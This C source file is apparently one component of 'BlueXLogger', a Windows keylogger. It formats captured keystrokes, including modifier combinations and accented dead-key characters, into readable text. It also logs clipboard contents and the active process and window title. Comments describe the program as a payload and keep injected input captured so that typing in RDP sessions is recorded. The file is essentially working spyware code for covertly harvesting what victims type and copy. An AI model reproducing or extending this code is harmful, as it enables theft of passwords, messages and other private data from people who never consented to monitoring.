/*============================================================================
 * BlueXLogger - bxl_format.c
 * Deterministic key-event -> human-readable text formatter.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * All non-ASCII output is written as explicit UTF-8 byte escapes so the
 * produced bytes never depend on how the compiler interpreted this source
 * file's encoding.
 *==========================================================================*/
#include "bxl_format.h"

/*==========================================================================
 * Dead-key virtual codes
 *
 * These are documented by Microsoft (and produced by MapVirtualKey /
 * ToUnicodeEx) but the Windows SDK ships no VK_DEAD_* macros in winuser.h,
 * so they are declared here.
 *========================================================================*/
#ifndef VK_DEAD_GRAVE
#define VK_DEAD_GRAVE            0xC0
#endif
#ifndef VK_DEAD_ACUTE
#define VK_DEAD_ACUTE            0xBD
#endif
#ifndef VK_DEAD_CIRCUMFLEX
#define VK_DEAD_CIRCUMFLEX       0xBE
#endif
#ifndef VK_DEAD_TILDE
#define VK_DEAD_TILDE            0xBF
#endif
#ifndef VK_DEAD_MACRON
#define VK_DEAD_MACRON           0xC1
#endif
#ifndef VK_DEAD_BREVE
#define VK_DEAD_BREVE            0xC2
#endif
#ifndef VK_DEAD_ABOVEDOT
#define VK_DEAD_ABOVEDOT         0xC3
#endif
#ifndef VK_DEAD_DIAERESIS
#define VK_DEAD_DIAERESIS        0xC4
#endif
#ifndef VK_DEAD_ABOVERING
#define VK_DEAD_ABOVERING        0xC5
#endif
#ifndef VK_DEAD_DOUBLEACUTE
#define VK_DEAD_DOUBLEACUTE      0xC6
#endif
#ifndef VK_DEAD_CARON
#define VK_DEAD_CARON            0xC7
#endif
#ifndef VK_DEAD_CEDILLA
#define VK_DEAD_CEDILLA          0xC8
#endif
#ifndef VK_DEAD_OGONEK
#define VK_DEAD_OGONEK           0xC9
#endif
#ifndef VK_DEAD_IOTA
#define VK_DEAD_IOTA             0xCA
#endif
#ifndef VK_DEAD_VOICED_SOUND
#define VK_DEAD_VOICED_SOUND     0xCB
#endif
#ifndef VK_DEAD_SEMIVOICED_SOUND
#define VK_DEAD_SEMIVOICED_SOUND 0xCC
#endif

/*==========================================================================
 * Canonical token names for non-printable keys
 *========================================================================*/
typedef struct BxlToken {
    bxl_u16     vk;
    const char *name;
} BxlToken;

static const BxlToken k_tokens[] = {
    { VK_RETURN,   "ENTER"      },
    { VK_TAB,      "TAB"        },
    { VK_ESCAPE,   "ESC"        },
    { VK_BACK,     "BACKSPACE"  },
    { VK_DELETE,   "DEL"        },
    { VK_INSERT,   "INS"        },
    { VK_UP,       "UP"         },
    { VK_DOWN,     "DOWN"       },
    { VK_LEFT,     "LEFT"       },
    { VK_RIGHT,    "RIGHT"      },
    { VK_HOME,     "HOME"       },
    { VK_END,      "END"        },
    { VK_PRIOR,    "PGUP"       },
    { VK_NEXT,     "PGDN"       },
    { VK_SNAPSHOT, "PRTSC"      },
    { VK_PAUSE,    "PAUSE"      },
    { VK_SCROLL,   "SCROLLLOCK" },
    { VK_CAPITAL,  "CAPSLOCK"   },
    { VK_NUMLOCK,  "NUMLOCK"    },
    { VK_APPS,     "MENU"       },
    { VK_LWIN,     "WIN"        },
    { VK_RWIN,     "WIN"        },
    { VK_CLEAR,    "CLEAR"      },
    { VK_HELP,     "HELP"       },
    { VK_SELECT,   "SELECT"     },
    { VK_PRINT,    "PRINT"      },
    { VK_EXECUTE,  "EXECUTE"    },
    { VK_SLEEP,    "SLEEP"      },
    { VK_SPACE,    "SPACE"      },
    { VK_SEPARATOR,"SEPARATOR"  },
    { VK_BROWSER_BACK,      "BROWSER_BACK"      },
    { VK_BROWSER_FORWARD,   "BROWSER_FORWARD"   },
    { VK_BROWSER_REFRESH,   "BROWSER_REFRESH"   },
    { VK_BROWSER_STOP,      "BROWSER_STOP"      },
    { VK_BROWSER_SEARCH,    "BROWSER_SEARCH"    },
    { VK_BROWSER_FAVORITES, "BROWSER_FAVORITES" },
    { VK_BROWSER_HOME,      "BROWSER_HOME"      },
    { VK_VOLUME_MUTE,       "VOLUME_MUTE"       },
    { VK_VOLUME_DOWN,       "VOLUME_DOWN"       },
    { VK_VOLUME_UP,         "VOLUME_UP"         },
    { VK_MEDIA_NEXT_TRACK,  "MEDIA_NEXT"        },
    { VK_MEDIA_PREV_TRACK,  "MEDIA_PREV"        },
    { VK_MEDIA_STOP,        "MEDIA_STOP"        },
    { VK_MEDIA_PLAY_PAUSE,  "MEDIA_PLAY_PAUSE"  },
    { VK_LAUNCH_MAIL,       "LAUNCH_MAIL"       },
    { VK_LAUNCH_MEDIA_SELECT,"LAUNCH_MEDIA"     },
    { VK_LAUNCH_APP1,       "LAUNCH_APP1"       },
    { VK_LAUNCH_APP2,       "LAUNCH_APP2"       },
    { VK_ATTN,     "ATTN"       },
    { VK_CRSEL,    "CRSEL"      },
    { VK_EXSEL,    "EXSEL"      },
    { VK_EREOF,    "EREOF"      },
    { VK_PLAY,     "PLAY"       },
    { VK_ZOOM,     "ZOOM"       },
    { VK_OEM_CLEAR,"OEM_CLEAR"  },
};

static const BxlToken *token_lookup(bxl_u16 vk)
{
    size_t i;
    for (i = 0; i < BXL_COUNT_OF(k_tokens); i++)
        if (k_tokens[i].vk == vk) return &k_tokens[i];
    return NULL;
}

/*==========================================================================
 * US layout printable mapping
 *========================================================================*/
static const char k_digit_unshifted[10] = { '0','1','2','3','4','5','6','7','8','9' };
static const char k_digit_shifted[10]   = { ')','!','@','#','$','%','^','&','*','(' };

/*
 * Produce the printable character for a virtual key on the US layout.
 * Returns BXL_TRUE when a character was produced.
 */
static int us_char_for_vk(bxl_u16 vk, int shifted, int numlock, char *out)
{
    if (vk >= 'A' && vk <= 'Z') {
        *out = (char)(shifted ? vk : (vk - 'A' + 'a'));
        return BXL_TRUE;
    }
    if (vk >= '0' && vk <= '9') {
        int idx = (int)(vk - '0');
        *out = shifted ? k_digit_shifted[idx] : k_digit_unshifted[idx];
        return BXL_TRUE;
    }

    switch (vk) {
    case VK_SPACE:      *out = ' ';  return BXL_TRUE;

    case VK_OEM_1:      *out = shifted ? ':'  : ';';  return BXL_TRUE;
    case VK_OEM_PLUS:   *out = shifted ? '+'  : '=';  return BXL_TRUE;
    case VK_OEM_COMMA:  *out = shifted ? '<'  : ',';  return BXL_TRUE;
    case VK_OEM_MINUS:  *out = shifted ? '_'  : '-';  return BXL_TRUE;
    case VK_OEM_PERIOD: *out = shifted ? '>'  : '.';  return BXL_TRUE;
    case VK_OEM_2:      *out = shifted ? '?'  : '/';  return BXL_TRUE;
    case VK_OEM_3:      *out = shifted ? '~'  : '`';  return BXL_TRUE;
    case VK_OEM_4:      *out = shifted ? '{'  : '[';  return BXL_TRUE;
    case VK_OEM_5:      *out = shifted ? '|'  : '\\'; return BXL_TRUE;
    case VK_OEM_6:      *out = shifted ? '}'  : ']';  return BXL_TRUE;
    case VK_OEM_7:      *out = shifted ? '"'  : '\''; return BXL_TRUE;
    case VK_OEM_102:    *out = shifted ? '|'  : '\\'; return BXL_TRUE;
    case VK_OEM_8:      return BXL_FALSE;   /* not present on US */

    /* Numpad - unaffected by Shift, governed by NumLock. */
    case VK_NUMPAD0: case VK_NUMPAD1: case VK_NUMPAD2: case VK_NUMPAD3:
    case VK_NUMPAD4: case VK_NUMPAD5: case VK_NUMPAD6: case VK_NUMPAD7:
    case VK_NUMPAD8: case VK_NUMPAD9:
        if (!numlock) return BXL_FALSE;
        *out = (char)('0' + (vk - VK_NUMPAD0));
        return BXL_TRUE;

    case VK_DECIMAL:
        if (!numlock) return BXL_FALSE;
        *out = '.';
        return BXL_TRUE;

    case VK_ADD:      *out = '+'; return BXL_TRUE;
    case VK_SUBTRACT: *out = '-'; return BXL_TRUE;
    case VK_MULTIPLY: *out = '*'; return BXL_TRUE;
    case VK_DIVIDE:   *out = '/'; return BXL_TRUE;

    default:
        return BXL_FALSE;
    }
}

/*==========================================================================
 * Dead keys and composition
 *========================================================================*/
typedef struct BxlCompose {
    char        base;
    const char *composed;   /* UTF-8 */
} BxlCompose;

typedef struct BxlDeadKey {
    bxl_u16          vk;
    const char      *name;
    const char      *standalone;  /* UTF-8 glyph emitted before a space */
    const BxlCompose *map;
    size_t           map_len;
} BxlDeadKey;

/* -- composition tables (UTF-8 byte escapes) ------------------------------*/
static const BxlCompose k_acute[] = {
    { 'a', "\xC3\xA1" }, { 'e', "\xC3\xA9" }, { 'i', "\xC3\xAD" },
    { 'o', "\xC3\xB3" }, { 'u', "\xC3\xBA" }, { 'y', "\xC3\xBD" },
    { 'c', "\xC4\x87" }, { 'n', "\xC5\x84" }, { 's', "\xC5\x9B" },
    { 'z', "\xC5\xBA" },
    { 'A', "\xC3\x81" }, { 'E', "\xC3\x89" }, { 'I', "\xC3\x8D" },
    { 'O', "\xC3\x93" }, { 'U', "\xC3\x9A" }, { 'Y', "\xC3\x9D" },
    { 'C', "\xC4\x86" }, { 'N', "\xC5\x83" }, { 'S', "\xC5\x9A" },
    { 'Z', "\xC5\xB9" },
};

static const BxlCompose k_grave[] = {
    { 'a', "\xC3\xA0" }, { 'e', "\xC3\xA8" }, { 'i', "\xC3\xAC" },
    { 'o', "\xC3\xB2" }, { 'u', "\xC3\xB9" },
    { 'A', "\xC3\x80" }, { 'E', "\xC3\x88" }, { 'I', "\xC3\x8C" },
    { 'O', "\xC3\x92" }, { 'U', "\xC3\x99" },
};

static const BxlCompose k_circumflex[] = {
    { 'a', "\xC3\xA2" }, { 'e', "\xC3\xAA" }, { 'i', "\xC3\xAE" },
    { 'o', "\xC3\xB4" }, { 'u', "\xC3\xBB" },
    { 'A', "\xC3\x82" }, { 'E', "\xC3\x8A" }, { 'I', "\xC3\x8E" },
    { 'O', "\xC3\x94" }, { 'U', "\xC3\x9B" },
};

static const BxlCompose k_tilde[] = {
    { 'a', "\xC3\xA3" }, { 'n', "\xC3\xB1" }, { 'o', "\xC3\xB5" },
    { 'A', "\xC3\x83" }, { 'N', "\xC3\x91" }, { 'O', "\xC3\x95" },
};

static const BxlCompose k_diaeresis[] = {
    { 'a', "\xC3\xA4" }, { 'e', "\xC3\xAB" }, { 'i', "\xC3\xAF" },
    { 'o', "\xC3\xB6" }, { 'u', "\xC3\xBC" }, { 'y', "\xC3\xBF" },
    { 'A', "\xC3\x84" }, { 'E', "\xC3\x8B" }, { 'I', "\xC3\x8F" },
    { 'O', "\xC3\x96" }, { 'U', "\xC3\x9C" }, { 'Y', "\xC5\xB8" },
};

static const BxlCompose k_cedilla[] = {
    { 'c', "\xC3\xA7" }, { 'C', "\xC3\x87" },
};

static const BxlCompose k_ring[] = {
    { 'a', "\xC3\xA5" }, { 'A', "\xC3\x85" },
};

static const BxlCompose k_caron[] = {
    { 'c', "\xC4\x8D" }, { 's', "\xC5\xA1" }, { 'z', "\xC5\xBE" },
    { 'n', "\xC5\x88" }, { 'r', "\xC5\x99" }, { 'e', "\xC4\x9B" },
    { 'C', "\xC4\x8C" }, { 'S', "\xC5\xA0" }, { 'Z', "\xC5\xBD" },
    { 'N', "\xC5\x87" }, { 'R', "\xC5\x98" }, { 'E', "\xC4\x9A" },
};

static const BxlCompose k_ogonek[] = {
    { 'a', "\xC4\x85" }, { 'e', "\xC4\x99" },
    { 'A', "\xC4\x84" }, { 'E', "\xC4\x98" },
};

static const BxlCompose k_macron[] = {
    { 'a', "\xC4\x81" }, { 'e', "\xC4\x93" }, { 'i', "\xC4\xAB" },
    { 'o', "\xC5\x8D" }, { 'u', "\xC5\xAB" },
    { 'A', "\xC4\x80" }, { 'E', "\xC4\x92" }, { 'I', "\xC4\xAA" },
    { 'O', "\xC5\x8C" }, { 'U', "\xC5\xAA" },
};

static const BxlCompose k_breve[] = {
    { 'a', "\xC4\x83" }, { 'g', "\xC4\x9F" },
    { 'A', "\xC4\x82" }, { 'G', "\xC4\x9E" },
};

static const BxlCompose k_abovedot[] = {
    { 'z', "\xC5\xBC" }, { 'Z', "\xC5\xBB" },
};

static const BxlCompose k_doubleacute[] = {
    { 'o', "\xC5\x91" }, { 'u', "\xC5\xB1" },
    { 'O', "\xC5\x90" }, { 'U', "\xC5\xB0" },
};

static const BxlDeadKey k_dead[] = {
    { VK_DEAD_GRAVE,        "GRAVE",        "`",      k_grave,       BXL_COUNT_OF(k_grave) },
    { VK_DEAD_ACUTE,        "ACUTE",        "\xC2\xB4", k_acute,      BXL_COUNT_OF(k_acute) },
    { VK_DEAD_CIRCUMFLEX,   "CIRCUMFLEX",   "^",      k_circumflex,  BXL_COUNT_OF(k_circumflex) },
    { VK_DEAD_TILDE,        "TILDE",        "~",      k_tilde,       BXL_COUNT_OF(k_tilde) },
    { VK_DEAD_DIAERESIS,    "DIAERESIS",    "\xC2\xA8", k_diaeresis, BXL_COUNT_OF(k_diaeresis) },
    { VK_DEAD_MACRON,       "MACRON",       "\xC2\xAF", k_macron,    BXL_COUNT_OF(k_macron) },
    { VK_DEAD_BREVE,        "BREVE",        "\xCB\x98", k_breve,     BXL_COUNT_OF(k_breve) },
    { VK_DEAD_ABOVEDOT,     "ABOVEDOT",     "\xCB\x99", k_abovedot,  BXL_COUNT_OF(k_abovedot) },
    { VK_DEAD_ABOVERING,    "ABOVERING",    "\xCB\x9A", k_ring,      BXL_COUNT_OF(k_ring) },
    { VK_DEAD_DOUBLEACUTE,  "DOUBLEACUTE",  "\xCB\x9D", k_doubleacute, BXL_COUNT_OF(k_doubleacute) },
    { VK_DEAD_CARON,        "CARON",        "\xCB\x87", k_caron,     BXL_COUNT_OF(k_caron) },
    { VK_DEAD_CEDILLA,      "CEDILLA",      "\xC2\xB8", k_cedilla,   BXL_COUNT_OF(k_cedilla) },
    { VK_DEAD_OGONEK,       "OGONEK",       "\xCB\x9B", k_ogonek,    BXL_COUNT_OF(k_ogonek) },
    { VK_DEAD_IOTA,         "IOTA",         "\xCD\x85", NULL,        0 },
};

static const BxlDeadKey *dead_lookup(bxl_u16 vk)
{
    size_t i;
    for (i = 0; i < BXL_COUNT_OF(k_dead); i++)
        if (k_dead[i].vk == vk) return &k_dead[i];
    return NULL;
}

/* Four VK codes are simultaneously ordinary OEM punctuation keys and dead
 * keys; which one the user actually pressed depends on the active layout.
 *
 *   VK_OEM_MINUS  (0xBD) == VK_DEAD_ACUTE
 *   VK_OEM_PERIOD (0xBE) == VK_DEAD_CIRCUMFLEX
 *   VK_OEM_2      (0xBF) == VK_DEAD_TILDE
 *   VK_OEM_3      (0xC0) == VK_DEAD_GRAVE
 *
 * On a plain US layout they are '-' '.' '/' '`' and must be logged as such;
 * on US-International they are dead keys. A synthetic event carries no layout
 * information, so for these four the caller must say so explicitly through
 * BxlKeyEvent.is_dead (the capture layer sets it from ToUnicodeEx, which
 * returns -1 for a dead key). Without that flag the key is treated as the
 * printable OEM character, which is the correct default for the common case. */
static int vk_is_oem_ambiguous(bxl_u16 vk)
{
    return (vk == VK_OEM_MINUS || vk == VK_OEM_PERIOD ||
            vk == VK_OEM_2     || vk == VK_OEM_3) ? BXL_TRUE : BXL_FALSE;
}

/* TRUE when the code *can* denote a dead key on some layout. Callers that
 * have real layout information should use BxlKeyEvent.is_dead instead. */
int bxl_fmt_is_dead_key(bxl_u16 vk)
{
    return dead_lookup(vk) ? BXL_TRUE : BXL_FALSE;
}

/* The decision actually used by the formatter. */
static int ev_is_dead_key(const BxlKeyEvent *ev)
{
    if (ev->is_dead) return BXL_TRUE;
    if (vk_is_oem_ambiguous(ev->vk)) return BXL_FALSE;
    return dead_lookup(ev->vk) ? BXL_TRUE : BXL_FALSE;
}

static const char *dead_compose(const BxlDeadKey *dk, char base)
{
    size_t i;
    if (!dk || !dk->map) return NULL;
    for (i = 0; i < dk->map_len; i++)
        if (dk->map[i].base == base) return dk->map[i].composed;
    return NULL;
}

/*==========================================================================
 * Modifiers
 *========================================================================*/
int bxl_fmt_is_modifier(bxl_u16 vk)
{
    switch (vk) {
    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
    case VK_MENU: case VK_LMENU: case VK_RMENU:
    case VK_LWIN: case VK_RWIN:
        return BXL_TRUE;
    default:
        return BXL_FALSE;
    }
}

static void modifier_update(BxlModState *st, bxl_u16 vk, int down)
{
    switch (vk) {
    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
        st->shift = (bxl_u8)(down ? 1 : 0);
        break;
    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
        st->ctrl = (bxl_u8)(down ? 1 : 0);
        break;
    case VK_MENU: case VK_LMENU: case VK_RMENU:
        st->alt = (bxl_u8)(down ? 1 : 0);
        break;
    case VK_LWIN: case VK_RWIN:
        st->win = (bxl_u8)(down ? 1 : 0);
        break;
    default:
        break;
    }
}

void bxl_fmt_default_options(BxlFmtOptions *opt)
{
    if (!opt) return;
    opt->suppress_special_repeats = 1;
    opt->show_modifier_combos     = 1;
    opt->compose_dead_keys        = 1;
    /* Capture injected input. Turning this off looks like a sensible way to
     * avoid logging synthetic keys, but it silently discards real typing in
     * several ordinary setups: an RDP session injects every keystroke it
     * forwards, a VM's input path does the same, and vendor keyboard software
     * (Logitech, Razer, some laptop drivers) and the on-screen keyboard all
     * deliver through SendInput. With this off, a payload running in an RDP
     * session captures nothing at all. Nothing in this program injects input,
     * so there is no self-logging to avoid. */
    opt->track_injected           = 1;
}

void bxl_fmt_init(BxlModState *st, const BxlFmtOptions *opt)
{
    BXL_UNUSED(opt);
    if (!st) return;
    memset(st, 0, sizeof(*st));
}

void bxl_fmt_set_locks(BxlModState *st, int capslock, int numlock, int scrolllock)
{
    if (!st) return;
    st->capslock   = (bxl_u8)(capslock   ? 1 : 0);
    st->numlock    = (bxl_u8)(numlock    ? 1 : 0);
    st->scrolllock = (bxl_u8)(scrolllock ? 1 : 0);
    st->seeded     = 1;
}

/*==========================================================================
 * Name resolution for <...> tokens and modifier combos
 *========================================================================*/
int bxl_fmt_vk_name(bxl_u16 vk, char *out, size_t out_cch)
{
    const BxlToken *t;

    if (!out || out_cch < 2) return BXL_FALSE;

    if (vk >= 'A' && vk <= 'Z') {
        out[0] = (char)vk;
        out[1] = '\0';
        return BXL_TRUE;
    }
    if (vk >= '0' && vk <= '9') {
        out[0] = (char)vk;
        out[1] = '\0';
        return BXL_TRUE;
    }
    if (vk >= VK_F1 && vk <= VK_F24) {
        return SUCCEEDED(StringCchPrintfA(out, out_cch, "F%u",
                                          (unsigned)(vk - VK_F1 + 1)));
    }
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        return SUCCEEDED(StringCchPrintfA(out, out_cch, "NUM%u",
                                          (unsigned)(vk - VK_NUMPAD0)));
    }

    /* OEM keys are named by their unshifted US glyph. */
    {
        char c;
        if (us_char_for_vk(vk, 0, 1, &c) && c != ' ') {
            out[0] = c;
            out[1] = '\0';
            return BXL_TRUE;
        }
    }

    t = token_lookup(vk);
    if (t) {
        return SUCCEEDED(StringCchCopyA(out, out_cch, t->name));
    }

    return BXL_FALSE;
}

/*==========================================================================
 * Emission helpers
 *========================================================================*/
static int emit_token(BxlBuf *out, const char *name)
{
    int n = 0;
    n += bxl_buf_appendc(out, '<');
    n += bxl_buf_appends(out, name);
    n += bxl_buf_appendc(out, '>');
    return n;
}

static int emit_combo(BxlBuf *out, const BxlModState *st, const char *key_name)
{
    int n = 0;
    n += bxl_buf_appendc(out, '<');
    if (st->ctrl) { n += bxl_buf_appends(out, "CTRL+"); }
    if (st->alt)  { n += bxl_buf_appends(out, "ALT+"); }
    if (st->shift){ n += bxl_buf_appends(out, "SHIFT+"); }
    if (st->win)  { n += bxl_buf_appends(out, "WIN+"); }
    n += bxl_buf_appends(out, key_name);
    n += bxl_buf_appendc(out, '>');
    return n;
}

static int emit_dead_marker(BxlBuf *out, const BxlDeadKey *dk)
{
    int n = 0;
    n += bxl_buf_appends(out, "<DEAD:");
    n += bxl_buf_appends(out, dk->name);
    n += bxl_buf_appendc(out, '>');
    return n;
}

/*==========================================================================
 * Main formatter
 *========================================================================*/
int bxl_fmt_apply(BxlModState *st, const BxlFmtOptions *opt,
                  const BxlKeyEvent *ev, BxlBuf *out)
{
    BxlFmtOptions def;
    bxl_u16 vk;
    int     shifted;
    char    ch;
    int     n = 0;

    if (!st || !ev || !out) return 0;
    if (!opt) { bxl_fmt_default_options(&def); opt = &def; }

    if (ev->injected && !opt->track_injected) return 0;

    vk = ev->vk;

    /* ---- lock keys toggle on key-down, then report themselves ---------- */
    if (vk == VK_CAPITAL) {
        if (ev->is_down) {
            st->capslock = (bxl_u8)(st->capslock ? 0 : 1);
            st->last_special_vk = 0;
            return emit_token(out, "CAPSLOCK");
        }
        return 0;
    }
    if (vk == VK_NUMLOCK) {
        if (ev->is_down) {
            st->numlock = (bxl_u8)(st->numlock ? 0 : 1);
            st->last_special_vk = 0;
            return emit_token(out, "NUMLOCK");
        }
        return 0;
    }
    if (vk == VK_SCROLL) {
        if (ev->is_down) {
            st->scrolllock = (bxl_u8)(st->scrolllock ? 0 : 1);
            st->last_special_vk = 0;
            return emit_token(out, "SCROLLLOCK");
        }
        return 0;
    }

    /* ---- pure modifiers only update state ------------------------------ */
    if (bxl_fmt_is_modifier(vk)) {
        modifier_update(st, vk, ev->is_down);
        return 0;
    }

    if (!ev->is_down) {
        /* Key-up ends any auto-repeat run for that key. */
        if (vk == st->last_special_vk) st->last_special_vk = 0;
        return 0;
    }

    /* ---- dead keys ------------------------------------------------------ */
    if (ev_is_dead_key(ev)) {
        const BxlDeadKey *dk = dead_lookup(vk);
        if (opt->compose_dead_keys) {
            if (st->dead_pending) {
                /* Two dead keys in a row: flush the first, arm the second. */
                const BxlDeadKey *prev = dead_lookup(st->dead_pending);
                if (prev) n += emit_dead_marker(out, prev);
            }
            st->dead_pending = vk;
            st->last_special_vk = 0;
            return n;
        }
        st->last_special_vk = 0;
        return emit_dead_marker(out, dk);
    }

    shifted = st->shift ? 1 : 0;
    if (vk >= 'A' && vk <= 'Z')
        shifted = (shifted ^ (st->capslock ? 1 : 0));

    /* ---- resolve the printable character -------------------------------- */
    {
        int printable = us_char_for_vk(vk, shifted, st->numlock ? 1 : 0, &ch);

        /* A pending dead key composes with the next printable character. */
        if (st->dead_pending && opt->compose_dead_keys) {
            const BxlDeadKey *dk = dead_lookup(st->dead_pending);
            const char *composed = printable ? dead_compose(dk, ch) : NULL;

            if (composed) {
                st->dead_pending = 0;
                st->last_special_vk = 0;
                return bxl_buf_appends(out, composed);
            }
            if (printable && ch == ' ' && dk && dk->standalone) {
                st->dead_pending = 0;
                st->last_special_vk = 0;
                return bxl_buf_appends(out, dk->standalone);
            }
            /* No composition - flush the marker and continue normally. */
            if (dk) n += emit_dead_marker(out, dk);
            st->dead_pending = 0;
        }

        /* Modifier combinations never yield a bare character. */
        if (printable && (st->ctrl || st->alt || st->win) &&
            opt->show_modifier_combos) {
            char name[32];
            if (bxl_fmt_vk_name(vk, name, sizeof(name))) {
                st->last_special_vk = 0;
                return n + emit_combo(out, st, name);
            }
        }

        if (printable) {
            st->last_special_vk = 0;
            return n + bxl_buf_appendc(out, ch);
        }
    }

    /* ---- non-printable: token or modifier combo ------------------------- */
    {
        char name[64];
        if (!bxl_fmt_vk_name(vk, name, sizeof(name)))
            return n;   /* unmapped key - emit nothing rather than noise */

        if (st->ctrl || st->alt || st->win) {
            st->last_special_vk = 0;
            return n + emit_combo(out, st, name);
        }

        /* Auto-repeat suppression for held special keys. */
        if (opt->suppress_special_repeats && st->last_special_vk == vk) {
            st->last_special_run++;
            return n;
        }
        st->last_special_vk  = vk;
        st->last_special_run = 1;
        return n + emit_token(out, name);
    }
}

int bxl_fmt_apply_all(BxlModState *st, const BxlFmtOptions *opt,
                      const BxlKeyEvent *evs, size_t count, BxlBuf *out)
{
    size_t i;
    int    total = 0;
    if (!st || !evs || !out) return 0;
    for (i = 0; i < count; i++)
        total += bxl_fmt_apply(st, opt, &evs[i], out);
    return total;
}

/*==========================================================================
 * Clipboard + context rendering
 *========================================================================*/
int bxl_fmt_clipboard(BxlBuf *out, const char *text, size_t len)
{
    size_t i;
    int    n = 0;

    if (!out) return 0;
    n += bxl_buf_appends(out, "<CLIPBOARD>");
    for (i = 0; i < len && text; i++) {
        char c = text[i];
        if (c == '\r') continue;
        if (c == '\n') { n += bxl_buf_appends(out, "\\n"); continue; }
        n += bxl_buf_appendc(out, c);
    }
    n += bxl_buf_appends(out, "</CLIPBOARD>");
    return n;
}

int bxl_fmt_context_header(BxlBuf *out, const char *timestamp,
                           const char *process_name, const char *window_title)
{
    int n = 0;

    if (!out) return 0;

    n += bxl_buf_appendc(out, '[');
    n += bxl_buf_appends(out, timestamp ? timestamp : "?");
    n += bxl_buf_appends(out, "] [");
    n += bxl_buf_appends(out, (process_name && process_name[0])
                              ? process_name : "unknown");
    n += bxl_buf_appends(out, " \xE2\x80\x94 \"");   /* em dash */
    if (window_title) {
        for (const char *p = window_title; *p; p++) {
            /* Titles are attacker-influenced; never let them break the line. */
            if (*p == '\r' || *p == '\n') { n += bxl_buf_appendc(out, ' '); continue; }
            if (*p == '"')               { n += bxl_buf_appendc(out, '\''); continue; }
            n += bxl_buf_appendc(out, *p);
        }
    }
    n += bxl_buf_appends(out, "\"]");
    return n;
}
